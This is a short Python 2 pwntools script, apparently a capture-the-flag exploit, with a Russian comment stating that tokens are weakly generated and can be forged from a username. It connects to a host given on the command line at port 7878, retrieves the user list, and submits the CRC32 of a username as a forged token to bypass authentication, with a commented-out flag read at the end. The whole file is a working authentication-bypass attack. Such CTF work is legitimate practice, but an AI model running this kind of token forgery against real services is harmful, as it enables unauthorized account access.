#!/usr/bin/env python

# Токены генерируются плохо, и мы можем по имени пользователя сгенерировать подходящий токен

from pwn import *
from binascii import crc32
import sys

r = remote(sys.argv[1], 7878)

r.recv()
r.sendline("3")
list_users = r.recvuntil("Choose")

l = list_users.split('\n')


tokens = l

r.recv()
r.sendline('4')
r.recv()
r.sendline(hex(crc32(str(tokens[len(tokens) - 2])))[2:])
print r.recvuntil("ew")
print r.recv()
 
# flag = r.recv()
# 
# print flag
